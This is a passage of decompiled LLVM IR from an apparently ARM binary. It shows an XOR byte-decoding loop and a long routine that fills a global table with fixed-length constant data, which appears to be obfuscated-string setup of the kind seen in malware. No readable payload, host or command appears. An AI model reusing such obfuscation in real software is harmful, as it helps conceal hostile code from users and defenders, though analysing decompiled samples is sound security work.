  %v2_123c0 = load i32, i32* %v1_123c0, align 4
  %v2_123c4 = add i32 %v2_123c0, %v2_123cc
  %v3_123c4 = inttoptr i32 %v2_123c4 to i8*
  %v4_123c4 = load i8, i8* %v3_123c4, align 1
  %v6_123c4 = zext i8 %v4_123c4 to i32
  %v2_123c8 = xor i32 %v6_123c4, %v1_123b4
  %v1_123cc = trunc i32 %v2_123c8 to i8
  store i8 %v1_123cc, i8* %v3_123c4, align 1
  %v0_123d0 = load i32, i32* @lr, align 4
  %v1_123d0 = inttoptr i32 %v0_123d0 to i32*
  %v2_123d0 = load i32, i32* %v1_123d0, align 4
  %v0_123d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_123d4 = add i32 %v0_123d4, %v2_123d0
  %v3_123d4 = inttoptr i32 %v2_123d4 to i8*
  %v4_123d4 = load i8, i8* %v3_123d4, align 1
  %v6_123d4 = zext i8 %v4_123d4 to i32
  %v0_123d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_123d8 = xor i32 %v0_123d8, %v6_123d4
  %v1_123dc = trunc i32 %v2_123d8 to i8
  store i8 %v1_123dc, i8* %v3_123d4, align 1
  %v0_123e0 = load i32, i32* @lr, align 4
  %v1_123e0 = inttoptr i32 %v0_123e0 to i32*
  %v2_123e0 = load i32, i32* %v1_123e0, align 4
  %v0_123e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_123e4 = add i32 %v0_123e4, %v2_123e0
  %v3_123e4 = inttoptr i32 %v2_123e4 to i8*
  %v4_123e4 = load i8, i8* %v3_123e4, align 1
  %v6_123e4 = zext i8 %v4_123e4 to i32
  %v0_123e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_123e8 = xor i32 %v0_123e8, %v6_123e4
  %v1_123ec = trunc i32 %v2_123e8 to i8
  store i8 %v1_123ec, i8* %v3_123e4, align 1
  %v0_123f0 = load i32, i32* @lr, align 4
  %v1_123f0 = inttoptr i32 %v0_123f0 to i32*
  %v2_123f0 = load i32, i32* %v1_123f0, align 4
  %v0_123f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_123f4 = add i32 %v0_123f4, %v2_123f0
  %v3_123f4 = inttoptr i32 %v2_123f4 to i8*
  %v4_123f4 = load i8, i8* %v3_123f4, align 1
  %v6_123f4 = zext i8 %v4_123f4 to i32
  %v0_123f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_123f8 = xor i32 %v0_123f8, %v6_123f4
  %v1_123fc = trunc i32 %v2_123f8 to i8
  store i8 %v1_123fc, i8* %v3_123f4, align 1
  %v0_12400 = load i32, i32* @lr, align 4
  %v1_12400 = add i32 %v0_12400, 4
  %v2_12400 = inttoptr i32 %v1_12400 to i8*
  %v3_12400 = load i8, i8* %v2_12400, align 1
  %v4_12400 = zext i8 %v3_12400 to i32
  %v0_12404 = load i32, i32* %r7.global-to-local, align 4
  %v1_12404 = add i32 %v0_12404, 1
  %v2_12404 = inttoptr i32 %v1_12404 to i8*
  %v3_12404 = load i8, i8* %v2_12404, align 1
  %v4_12404 = zext i8 %v3_12404 to i32
  %v0_12408 = load i32, i32* %ip.global-to-local, align 4
  %v1_12408 = add i32 %v0_12408, 1
  store i32 %v1_12408, i32* %ip.global-to-local, align 4
  %v4_1240c = mul nuw nsw i32 %v4_12404, 256
  %v5_1240c = or i32 %v4_1240c, %v4_12400
  store i32 %v5_1240c, i32* @r2, align 4
  %v8_12414 = icmp sgt i32 %v5_1240c, %v1_12408
  br i1 %v8_12414, label %dec_label_pc_123c0, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %dec_label_pc_123c0
  %v2_12418 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12418, i32* @r4, align 4
  ret i32 %v1_123b4

; uselistorder directives
  uselistorder i32 %v1_12408, { 1, 2, 0 }
  uselistorder i32 %v0_12400, { 1, 0 }
  uselistorder i32 %v1_123b4, { 0, 2, 1 }
  uselistorder i32 %v2_12390, { 3, 0, 1, 2, 4 }
}

define i32 @function_12424() local_unnamed_addr {
dec_label_pc_12424:
  %fp.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v1_1242c = call i32 @function_14100(i32 10)
  store i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 10, i32* %r8.global-to-local, align 4
  store i32 %v1_1242c, i32* @r5, align 4
  %v4_12448 = call i32 @function_12d10(i32 %v1_1242c, i32 ptrtoint ([11 x i8]* @global_var_161d8.344 to i32), i32 10)
  %v0_12450 = load i32, i32* @r5, align 4
  store i32 %v0_12450, i32* @global_var_1ecc0.345, align 4
  store i8 10, i8* bitcast (i32* @global_var_1ecc4.346 to i8*), align 4
  %v0_12458 = load i32, i32* @r6, align 4
  %v1_12458 = trunc i32 %v0_12458 to i8
  store i8 %v1_12458, i8* bitcast (i32* @global_var_1ecc5.347 to i8*), align 4
  %v1_1245c = call i32 @function_14100(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 %v1_1245c, i32* @r7, align 4
  %v4_12470 = call i32 @function_12d10(i32 %v1_1245c, i32 ptrtoint ([3 x i8]* @global_var_161cc.349 to i32), i32 2)
  %v0_12478 = load i32, i32* @r7, align 4
  store i32 %v0_12478, i32* @global_var_1ecc8.350, align 4
  %v0_1247c = load i32, i32* @r5, align 4
  %v1_1247c = trunc i32 %v0_1247c to i8
  store i8 %v1_1247c, i8* bitcast (i32* @global_var_1eccc.351 to i8*), align 4
  %v0_12480 = load i32, i32* @r6, align 4
  %v1_12480 = trunc i32 %v0_12480 to i8
  store i8 %v1_12480, i8* bitcast (i32* @global_var_1eccd.352 to i8*), align 4
  %v1_12484 = call i32 @function_14100(i32 18)
  store i32 %v1_12484, i32* @r7, align 4
  %v4_12494 = call i32 @function_12d10(i32 %v1_12484, i32 ptrtoint ([19 x i8]* @global_var_161d0.354 to i32), i32 18)
  %v0_1249c = load i32, i32* @r5, align 4
  store i8 18, i8* bitcast (i32* @global_var_1ed3c.355 to i8*), align 4
  %v0_124a4 = load i32, i32* @r7, align 4
  store i32 %v0_124a4, i32* @global_var_1ed38.356, align 4
  %v0_124a8 = load i32, i32* @r6, align 4
  %v1_124a8 = trunc i32 %v0_124a8 to i8
  store i8 %v1_124a8, i8* bitcast (i32* @global_var_1ed3d.357 to i8*), align 4
  %v1_124ac = call i32 @function_14100(i32 %v0_1249c)
  %v0_124b0 = load i32, i32* @r5, align 4
  store i32 %v1_124ac, i32* @r7, align 4
  %v3_124bc = call i32 @function_12d10(i32 %v1_124ac, i32 ptrtoint (i32* @global_var_161e4.359 to i32), i32 %v0_124b0)
  %v0_124c4 = load i32, i32* @r7, align 4
  store i32 %v0_124c4, i32* @global_var_1ed40.360, align 4
  %v0_124c8 = load i32, i32* @r5, align 4
  %v1_124c8 = trunc i32 %v0_124c8 to i8
  store i8 %v1_124c8, i8* bitcast (i32* @global_var_1ed44.361 to i8*), align 4
  %v0_124cc = load i32, i32* @r6, align 4
  %v1_124cc = trunc i32 %v0_124cc to i8
  store i8 %v1_124cc, i8* bitcast (i32* @global_var_1ed45.362 to i8*), align 4
  %v1_124d0 = call i32 @function_14100(i32 15)
  store i32 %v1_124d0, i32* @r5, align 4
  %v3_124e0 = call i32 @function_12d10(i32 %v1_124d0, i32 ptrtoint (i32* @global_var_161e8.364 to i32), i32 15)
  store i8 15, i8* bitcast (i32* @global_var_1ecbc.365 to i8*), align 4
  %v0_124f0 = load i32, i32* @r5, align 4
  store i32 %v0_124f0, i32* @global_var_1ecb8.366, align 4
  %v0_124f4 = load i32, i32* @r6, align 4
  %v1_124f4 = trunc i32 %v0_124f4 to i8
  store i8 %v1_124f4, i8* bitcast (i32* @global_var_1ecbd.367 to i8*), align 4
  %v1_124f8 = call i32 @function_14100(i32 29)
  store i32 %v1_124f8, i32* @r5, align 4
  %v3_12508 = call i32 @function_12d10(i32 %v1_124f8, i32 ptrtoint (i32* @global_var_161f8.369 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1ecd4.370 to i8*), align 4
  %v0_12518 = load i32, i32* @r5, align 4
  store i32 %v0_12518, i32* @global_var_1ecd0.371, align 4
  %v0_1251c = load i32, i32* @r6, align 4
  %v1_1251c = trunc i32 %v0_1251c to i8
  store i8 %v1_1251c, i8* bitcast (i32* @global_var_1ecd5.372 to i8*), align 4
  %v1_12520 = call i32 @function_14100(i32 7)
  store i32 7, i32* @r7, align 4
  store i32 %v1_12520, i32* @r5, align 4
  %v4_12534 = call i32 @function_12d10(i32 %v1_12520, i32 ptrtoint ([8 x i8]* @global_var_16218.374 to i32), i32 7)
  %v0_1253c = load i32, i32* @r5, align 4
  store i32 %v0_1253c, i32* @global_var_1ecd8.375, align 4
  %v0_12540 = load i32, i32* @r7, align 4
  %v1_12540 = trunc i32 %v0_12540 to i8
  store i8 %v1_12540, i8* bitcast (i32* @global_var_1ecdc.376 to i8*), align 4
  %v0_12544 = load i32, i32* @r6, align 4
  %v1_12544 = trunc i32 %v0_12544 to i8
  store i8 %v1_12544, i8* bitcast (i32* @global_var_1ecdd.377 to i8*), align 4
  %v1_12548 = call i32 @function_14100(i32 5)
  store i32 %v1_12548, i32* @r5, align 4
  %v4_12558 = call i32 @function_12d10(i32 %v1_12548, i32 ptrtoint ([6 x i8]* @global_var_16220.379 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1ece4.380 to i8*), align 4
  %v0_12568 = load i32, i32* @r5, align 4
  store i32 %v0_12568, i32* @global_var_1ece0.381, align 4
  %v0_1256c = load i32, i32* @r6, align 4
  %v1_1256c = trunc i32 %v0_1256c to i8
  store i8 %v1_1256c, i8* bitcast (i32* @global_var_1ece5.382 to i8*), align 4
  %v1_12570 = call i32 @function_14100(i32 11)
  store i32 %v1_12570, i32* @r5, align 4
  %v3_12580 = call i32 @function_12d10(i32 %v1_12570, i32 ptrtoint (i32* @global_var_16228.384 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1ecec.385 to i8*), align 4
  %v0_12590 = load i32, i32* @r5, align 4
  store i32 %v0_12590, i32* @global_var_1ece8.386, align 4
  %v0_12594 = load i32, i32* @r6, align 4
  %v1_12594 = trunc i32 %v0_12594 to i8
  store i8 %v1_12594, i8* bitcast (i32* @global_var_1eced.387 to i8*), align 4
  %v1_12598 = call i32 @function_14100(i32 4)
  store i32 %v1_12598, i32* @r5, align 4
  %v4_125a8 = call i32 @function_12d10(i32 %v1_12598, i32 ptrtoint ([5 x i8]* @global_var_16234.389 to i32), i32 4)
  %v0_125b0 = load i32, i32* @r7, align 4
  store i8 4, i8* bitcast (i32* @global_var_1ecf4.390 to i8*), align 4
  %v0_125b8 = load i32, i32* @r5, align 4
  store i32 %v0_125b8, i32* @global_var_1ecf0.391, align 4
  %v0_125bc = load i32, i32* @r6, align 4
  %v1_125bc = trunc i32 %v0_125bc to i8
  store i8 %v1_125bc, i8* bitcast (i32* @global_var_1ecf5.392 to i8*), align 4
  %v1_125c0 = call i32 @function_14100(i32 %v0_125b0)
  %v0_125c4 = load i32, i32* @r7, align 4
  store i32 %v1_125c0, i32* @r5, align 4
  %v4_125d0 = call i32 @function_12d10(i32 %v1_125c0, i32 ptrtoint ([8 x i8]* @global_var_1623c.394 to i32), i32 %v0_125c4)
  %v0_125d8 = load i32, i32* @r5, align 4
  store i32 %v0_125d8, i32* @global_var_1ecf8.395, align 4
  %v0_125dc = load i32, i32* @r7, align 4
  %v1_125dc = trunc i32 %v0_125dc to i8
  store i8 %v1_125dc, i8* bitcast (i32* @global_var_1ecfc.396 to i8*), align 4
  %v0_125e0 = load i32, i32* @r6, align 4
  %v1_125e0 = trunc i32 %v0_125e0 to i8
  store i8 %v1_125e0, i8* bitcast (i32* @global_var_1ecfd.397 to i8*), align 4
  %v1_125e4 = call i32 @function_14100(i32 8)
  store i32 %v1_125e4, i32* @r5, align 4
  %v4_125f4 = call i32 @function_12d10(i32 %v1_125e4, i32 ptrtoint ([9 x i8]* @global_var_16244.399 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1ed04.400 to i8*), align 4
  %v0_12604 = load i32, i32* @r5, align 4
  store i32 %v0_12604, i32* @global_var_1ed00.401, align 4
  %v0_12608 = load i32, i32* @r6, align 4
  %v1_12608 = trunc i32 %v0_12608 to i8
  store i8 %v1_12608, i8* bitcast (i32* @global_var_1ed05.402 to i8*), align 4
  %v1_1260c = call i32 @function_14100(i32 13)
  store i32 %v1_1260c, i32* @r5, align 4
  %v3_1261c = call i32 @function_12d10(i32 %v1_1260c, i32 ptrtoint (i32* @global_var_16250.404 to i32), i32 13)
  %v0_12624 = load i32, i32* %r8.global-to-local, align 4
  store i8 13, i8* bitcast (i32* @global_var_1ed0c.405 to i8*), align 4
  %v0_1262c = load i32, i32* @r5, align 4
  store i32 %v0_1262c, i32* @global_var_1ed08.406, align 4
  %v0_12630 = load i32, i32* @r6, align 4
  %v1_12630 = trunc i32 %v0_12630 to i8
  store i8 %v1_12630, i8* bitcast (i32* @global_var_1ed0d.407 to i8*), align 4
  %v1_12634 = call i32 @function_14100(i32 %v0_12624)
  %v0_1263c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_12634, i32* @r5, align 4
  %v4_12644 = call i32 @function_12d10(i32 %v1_12634, i32 ptrtoint ([11 x i8]* @global_var_16260.409 to i32), i32 %v0_1263c)
  %v0_1264c = load i32, i32* @r5, align 4
  store i32 %v0_1264c, i32* @global_var_1ed10.410, align 4
  %v1_12650 = trunc i32 %v0_1263c to i8
  store i8 %v1_12650, i8* bitcast (i32* @global_var_1ed14.411 to i8*), align 4
  %v0_12654 = load i32, i32* @r6, align 4
  %v1_12654 = trunc i32 %v0_12654 to i8
  store i8 %v1_12654, i8* bitcast (i32* @global_var_1ed15.412 to i8*), align 4
  %v1_12658 = call i32 @function_14100(i32 %v0_1263c)
  %v0_12660 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_12658, i32* @r5, align 4
  %v4_12668 = call i32 @function_12d10(i32 %v1_12658, i32 ptrtoint ([11 x i8]* @global_var_1626c.414 to i32), i32 %v0_12660)
  %v0_12670 = load i32, i32* @r5, align 4
  store i32 %v0_12670, i32* @global_var_1ed18.415, align 4
  %v1_12674 = trunc i32 %v0_12660 to i8
  store i8 %v1_12674, i8* bitcast (i32* @global_var_1ed1c.416 to i8*), align 4
  %v0_12678 = load i32, i32* @r6, align 4
  %v1_12678 = trunc i32 %v0_12678 to i8
  store i8 %v1_12678, i8* bitcast (i32* @global_var_1ed1d.417 to i8*), align 4
  %v1_1267c = call i32 @function_14100(i32 33)
  store i32 %v1_1267c, i32* @r5, align 4
  %v3_1268c = call i32 @function_12d10(i32 %v1_1267c, i32 ptrtoint (i32* @global_var_16278.419 to i32), i32 33)
  store i8 33, i8* bitcast (i32* @global_var_1ed24.420 to i8*), align 4
  %v0_1269c = load i32, i32* @r5, align 4
  store i32 %v0_1269c, i32* @global_var_1ed20.421, align 4
  %v0_126a0 = load i32, i32* @r6, align 4
  %v1_126a0 = trunc i32 %v0_126a0 to i8
  store i8 %v1_126a0, i8* bitcast (i32* @global_var_1ed25.422 to i8*), align 4
  %v1_126a4 = call i32 @function_14100(i32 8)
  store i32 %v1_126a4, i32* @r5, align 4
  %v4_126b4 = call i32 @function_12d10(i32 %v1_126a4, i32 ptrtoint ([9 x i8]* @global_var_1629c.424 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1ed2c.425 to i8*), align 4
  %v0_126c4 = load i32, i32* @r5, align 4
  store i32 %v0_126c4, i32* @global_var_1ed28.426, align 4
  %v0_126c8 = load i32, i32* @r6, align 4
  %v1_126c8 = trunc i32 %v0_126c8 to i8
  store i8 %v1_126c8, i8* bitcast (i32* @global_var_1ed2d.427 to i8*), align 4
  %v1_126cc = call i32 @function_14100(i32 11)
  store i32 %v1_126cc, i32* @r5, align 4
  %v4_126dc = call i32 @function_12d10(i32 %v1_126cc, i32 ptrtoint ([12 x i8]* @global_var_162a8.429 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1ed34.430 to i8*), align 4
  %v0_126ec = load i32, i32* @r5, align 4
  store i32 %v0_126ec, i32* @global_var_1ed30.431, align 4
  %v0_126f0 = load i32, i32* @r6, align 4
  %v1_126f0 = trunc i32 %v0_126f0 to i8
  store i8 %v1_126f0, i8* bitcast (i32* @global_var_1ed35.432 to i8*), align 4
  %v1_126f4 = call i32 @function_14100(i32 6)
  store i32 %v1_126f4, i32* @r5, align 4
  %v4_12704 = call i32 @function_12d10(i32 %v1_126f4, i32 ptrtoint ([7 x i8]* @global_var_162b4.434 to i32), i32 6)
  %v0_1270c = load i32, i32* @r7, align 4
  store i8 6, i8* bitcast (i32* @global_var_1ed4c.435 to i8*), align 4
  %v0_12714 = load i32, i32* @r5, align 4
  store i32 %v0_12714, i32* @global_var_1ed48.436, align 4
  %v0_12718 = load i32, i32* @r6, align 4
  %v1_12718 = trunc i32 %v0_12718 to i8
  store i8 %v1_12718, i8* bitcast (i32* @global_var_1ed4d.437 to i8*), align 4
  %v1_1271c = call i32 @function_14100(i32 %v0_1270c)
  %v0_12720 = load i32, i32* @r7, align 4
  store i32 %v1_1271c, i32* @r5, align 4
  %v4_1272c = call i32 @function_12d10(i32 %v1_1271c, i32 ptrtoint ([8 x i8]* @global_var_162bc.439 to i32), i32 %v0_12720)
  %v0_12730 = load i32, i32* @r7, align 4
  %v0_12734 = load i32, i32* @r5, align 4
  store i32 %v0_12734, i32* @global_var_1ed50.440, align 4
  %v1_12738 = trunc i32 %v0_12730 to i8
  store i8 %v1_12738, i8* bitcast (i32* @global_var_1ed54.441 to i8*), align 4
  %v0_1273c = load i32, i32* @r6, align 4
  %v1_1273c = trunc i32 %v0_1273c to i8
  store i8 %v1_1273c, i8* bitcast (i32* @global_var_1ed55.442 to i8*), align 4
  %v1_12740 = call i32 @function_14100(i32 %v0_12730)
  %v0_12744 = load i32, i32* @r7, align 4
  store i32 %v1_12740, i32* @r5, align 4
  %v4_12750 = call i32 @function_12d10(i32 %v1_12740, i32 ptrtoint ([8 x i8]* @global_var_162c4.444 to i32), i32 %v0_12744)
  %v0_12758 = load i32, i32* @r5, align 4
  store i32 %v0_12758, i32* @global_var_1ed58.445, align 4
  %v0_1275c = load i32, i32* @r7, align 4
  %v1_1275c = trunc i32 %v0_1275c to i8
  store i8 %v1_1275c, i8* bitcast (i32* @global_var_1ed5c.446 to i8*), align 4
  %v0_12760 = load i32, i32* @r6, align 4
  %v1_12760 = trunc i32 %v0_12760 to i8
  store i8 %v1_12760, i8* bitcast (i32* @global_var_1ed5d.447 to i8*), align 4
  %v1_12764 = call i32 @function_14100(i32 3)
  store i32 %v1_12764, i32* @r5, align 4
  %v4_12774 = call i32 @function_12d10(i32 %v1_12764, i32 ptrtoint ([4 x i8]* @global_var_162cc.449 to i32), i32 3)
  store i8 3, i8* bitcast (i32* @global_var_1ed64.450 to i8*), align 4
  %v0_12784 = load i32, i32* @r5, align 4
  store i32 %v0_12784, i32* @global_var_1ed60.451, align 4
  %v0_12788 = load i32, i32* @r6, align 4
  %v1_12788 = trunc i32 %v0_12788 to i8
  store i8 %v1_12788, i8* bitcast (i32* @global_var_1ed65.452 to i8*), align 4
  %v1_1278c = call i32 @function_14100(i32 19)
  store i32 %v1_1278c, i32* @r5, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_127a0 = call i32 @function_12d10(i32 %v1_1278c, i32 ptrtoint (i32* @global_var_162d0.454 to i32), i32 19)
  %v0_127a8 = load i32, i32* @r5, align 4
  store i32 %v0_127a8, i32* @global_var_1ed68.455, align 4
  store i8 19, i8* bitcast (i32* @global_var_1ed6c.456 to i8*), align 4
  %v0_127b0 = load i32, i32* @r6, align 4
  %v1_127b0 = trunc i32 %v0_127b0 to i8
  store i8 %v1_127b0, i8* bitcast (i32* @global_var_1ed6d.457 to i8*), align 4
  %v1_127b4 = call i32 @function_14100(i32 24)
  store i32 %v1_127b4, i32* @r5, align 4
  %v3_127c4 = call i32 @function_12d10(i32 %v1_127b4, i32 ptrtoint (i32* @global_var_162e4.459 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1ed74.460 to i8*), align 4
  %v0_127d4 = load i32, i32* @r5, align 4
  store i32 %v0_127d4, i32* @global_var_1ed70.461, align 4
  %v0_127d8 = load i32, i32* @r6, align 4
  %v1_127d8 = trunc i32 %v0_127d8 to i8
  store i8 %v1_127d8, i8* bitcast (i32* @global_var_1ed75.462 to i8*), align 4
  %v1_127dc = call i32 @function_14100(i32 9)
  store i32 %v1_127dc, i32* @r5, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  %v4_127f0 = call i32 @function_12d10(i32 %v1_127dc, i32 ptrtoint ([10 x i8]* @global_var_16300.464 to i32), i32 9)
  %v0_127f8 = load i32, i32* @r5, align 4
  store i32 %v0_127f8, i32* @global_var_1ed78.465, align 4
  store i8 9, i8* bitcast (i32* @global_var_1ed7c.466 to i8*), align 4
  %v0_12800 = load i32, i32* @r6, align 4
  %v1_12800 = trunc i32 %v0_12800 to i8
  store i8 %v1_12800, i8* bitcast (i32* @global_var_1ed7d.467 to i8*), align 4
  %v1_12804 = call i32 @function_14100(i32 16)
  store i32 %v1_12804, i32* @r5, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_12818 = call i32 @function_12d10(i32 %v1_12804, i32 ptrtoint (i32* @global_var_1630c.469 to i32), i32 16)
  %v0_12820 = load i32, i32* @r5, align 4
  store i32 %v0_12820, i32* @global_var_1ed80.470, align 4
  store i8 16, i8* bitcast (i32* @global_var_1ed84.471 to i8*), align 4
  %v0_12828 = load i32, i32* @r6, align 4
  %v1_12828 = trunc i32 %v0_12828 to i8
  store i8 %v1_12828, i8* bitcast (i32* @global_var_1ed85.472 to i8*), align 4
  %v1_1282c = call i32 @function_14100(i32 22)
  store i32 %v1_1282c, i32* @r5, align 4
  %v3_1283c = call i32 @function_12d10(i32 %v1_1282c, i32 ptrtoint (i32* @global_var_16320.474 to i32), i32 22)
  store i8 22, i8* bitcast (i32* @global_var_1ed8c.475 to i8*), align 4
  %v0_1284c = load i32, i32* @r5, align 4
  store i32 %v0_1284c, i32* @global_var_1ed88.476, align 4
  %v0_12850 = load i32, i32* @r6, align 4
  %v1_12850 = trunc i32 %v0_12850 to i8
  store i8 %v1_12850, i8* bitcast (i32* @global_var_1ed8d.477 to i8*), align 4
  %v1_12854 = call i32 @function_14100(i32 21)
  store i32 %v1_12854, i32* @r5, align 4
  %v3_12864 = call i32 @function_12d10(i32 %v1_12854, i32 ptrtoint (i32* @global_var_16338.479 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1ed94.480 to i8*), align 4
  %v0_12874 = load i32, i32* @r5, align 4
  store i32 %v0_12874, i32* @global_var_1ed90.481, align 4
  %v0_12878 = load i32, i32* @r6, align 4
  %v1_12878 = trunc i32 %v0_12878 to i8
  store i8 %v1_12878, i8* bitcast (i32* @global_var_1ed95.482 to i8*), align 4
  %v1_1287c = call i32 @function_14100(i32 17)
  store i32 %v1_1287c, i32* @r5, align 4
  %v4_1288c = call i32 @function_12d10(i32 %v1_1287c, i32 ptrtoint ([18 x i8]* @global_var_16350.484 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1ed9c.485 to i8*), align 4
  %v0_1289c = load i32, i32* @r5, align 4
  store i32 %v0_1289c, i32* @global_var_1ed98.486, align 4
  %v0_128a0 = load i32, i32* @r6, align 4
  %v1_128a0 = trunc i32 %v0_128a0 to i8
  store i8 %v1_128a0, i8* bitcast (i32* @global_var_1ed9d.487 to i8*), align 4
  %v1_128a4 = call i32 @function_14100(i32 12)
  %v0_128b0 = load i32, i32* @r7, align 4
  %v1_128b0 = add i32 %v0_128b0, 5
  store i32 %v1_128b0, i32* @r7, align 4
  store i32 %v1_128a4, i32* @r5, align 4
  %v3_128b8 = call i32 @function_12d10(i32 %v1_128a4, i32 ptrtoint (i32* @global_var_16364.489 to i32), i32 12)
  %v0_128c0 = load i32, i32* @r5, align 4
  store i32 %v0_128c0, i32* @global_var_1eda0.490, align 4
  %v0_128c4 = load i32, i32* @r7, align 4
  %v1_128c4 = trunc i32 %v0_128c4 to i8
  store i8 %v1_128c4, i8* bitcast (i32* @global_var_1eda4.491 to i8*), align 4
  %v0_128c8 = load i32, i32* @r6, align 4
  %v1_128c8 = trunc i32 %v0_128c8 to i8
  store i8 %v1_128c8, i8* bitcast (i32* @global_var_1eda5.492 to i8*), align 4
  %v1_128cc = call i32 @function_14100(i32 23)
  store i32 %v1_128cc, i32* @r5, align 4
  %v3_128dc = call i32 @function_12d10(i32 %v1_128cc, i32 ptrtoint (i32* @global_var_16374.494 to i32), i32 23)
  store i8 23, i8* bitcast (i32* @global_var_1edac.495 to i8*), align 4
  %v0_128ec = load i32, i32* @r5, align 4
  store i32 %v0_128ec, i32* @global_var_1eda8.496, align 4
  %v0_128f0 = load i32, i32* @r6, align 4
  %v1_128f0 = trunc i32 %v0_128f0 to i8
  store i8 %v1_128f0, i8* bitcast (i32* @global_var_1edad.497 to i8*), align 4
  %v1_128f4 = call i32 @function_14100(i32 83)
  store i32 %v1_128f4, i32* @r5, align 4
  %v3_12904 = call i32 @function_12d10(i32 %v1_128f4, i32 ptrtoint (i32* @global_var_1638c.499 to i32), i32 83)
  store i8 83, i8* bitcast (i32* @global_var_1edb4.500 to i8*), align 4
  %v0_12914 = load i32, i32* @r5, align 4
  store i32 %v0_12914, i32* @global_var_1edb0.501, align 4
  %v0_12918 = load i32, i32* @r6, align 4
  %v1_12918 = trunc i32 %v0_12918 to i8
  store i8 %v1_12918, i8* bitcast (i32* @global_var_1edb5.502 to i8*), align 4
  %v1_1291c = call i32 @function_14100(i32 32)
  store i32 %v1_1291c, i32* @r5, align 4
  %v3_1292c = call i32 @function_12d10(i32 %v1_1291c, i32 ptrtoint (i32* @global_var_163e0.504 to i32), i32 32)
  store i8 32, i8* bitcast (i32* @global_var_1edbc.505 to i8*), align 4
  %v0_1293c = load i32, i32* @r5, align 4
  store i32 %v0_1293c, i32* @global_var_1edb8.506, align 4
  %v0_12940 = load i32, i32* @r6, align 4
  %v1_12940 = trunc i32 %v0_12940 to i8
  store i8 %v1_12940, i8* bitcast (i32* @global_var_1edbd.507 to i8*), align 4
  %v1_12944 = call i32 @function_14100(i32 48)
  store i32 %v1_12944, i32* @r5, align 4
  %v3_12954 = call i32 @function_12d10(i32 %v1_12944, i32 ptrtoint (i32* @global_var_16404.509 to i32), i32 48)
  %v0_1295c = load i32, i32* @r7, align 4
  store i8 48, i8* bitcast (i32* @global_var_1edc4.510 to i8*), align 4
  %v0_12964 = load i32, i32* @r5, align 4
  store i32 %v0_12964, i32* @global_var_1edc0.511, align 4
  %v0_12968 = load i32, i32* @r6, align 4
  %v1_12968 = trunc i32 %v0_12968 to i8
  store i8 %v1_12968, i8* bitcast (i32* @global_var_1edc5.512 to i8*), align 4
  %v1_1296c = call i32 @function_14100(i32 %v0_1295c)
  %v0_12970 = load i32, i32* @r7, align 4
  store i32 %v1_1296c, i32* @r5, align 4
  %v3_1297c = call i32 @function_12d10(i32 %v1_1296c, i32 ptrtoint (i32* @global_var_16438.514 to i32), i32 %v0_12970)
  %v0_12980 = load i32, i32* %sl.global-to-local, align 4
  %v0_12984 = load i32, i32* @r5, align 4
  store i32 %v0_12984, i32* @global_var_1edc8.515, align 4
  %v0_12988 = load i32, i32* @r7, align 4
  %v1_12988 = trunc i32 %v0_12988 to i8
  store i8 %v1_12988, i8* bitcast (i32* @global_var_1edcc.516 to i8*), align 4
  %v0_1298c = load i32, i32* @r6, align 4
  %v1_1298c = trunc i32 %v0_1298c to i8
  store i8 %v1_1298c, i8* bitcast (i32* @global_var_1edcd.517 to i8*), align 4
  %v1_12990 = call i32 @function_14100(i32 %v0_12980)
  %v0_12998 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_12990, i32* @r5, align 4
  %v3_129a0 = call i32 @function_12d10(i32 %v1_12990, i32 ptrtoint (i32* @global_var_16448.519 to i32), i32 %v0_12998)
  %v0_129a4 = load i32, i32* %r8.global-to-local, align 4
  %v0_129a8 = load i32, i32* @r5, align 4
  store i32 %v0_129a8, i32* @global_var_1edd0.520, align 4
  %v1_129ac = trunc i32 %v0_12998 to i8
  store i8 %v1_129ac, i8* bitcast (i32* @global_var_1edd4.521 to i8*), align 4
  %v0_129b0 = load i32, i32* @r6, align 4
  %v1_129b0 = trunc i32 %v0_129b0 to i8
  store i8 %v1_129b0, i8* bitcast (i32* @global_var_1edd5.522 to i8*), align 4
  %v1_129b4 = call i32 @function_14100(i32 %v0_129a4)
  %v0_129bc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_129b4, i32* @r5, align 4
  %v3_129c4 = call i32 @function_12d10(i32 %v1_129b4, i32 ptrtoint (i32* @global_var_16454.524 to i32), i32 %v0_129bc)
  %v0_129c8 = load i32, i32* @r7, align 4
  %v0_129cc = load i32, i32* @r5, align 4
  store i32 %v0_129cc, i32* @global_var_1edd8.525, align 4
  %v1_129d0 = trunc i32 %v0_129bc to i8
  store i8 %v1_129d0, i8* bitcast (i32* @global_var_1eddc.526 to i8*), align 4
  %v0_129d4 = load i32, i32* @r6, align 4
  %v1_129d4 = trunc i32 %v0_129d4 to i8
  store i8 %v1_129d4, i8* bitcast (i32* @global_var_1eddd.527 to i8*), align 4
  %v1_129d8 = call i32 @function_14100(i32 %v0_129c8)
  %v0_129dc = load i32, i32* @r7, align 4
  store i32 %v1_129d8, i32* @r5, align 4
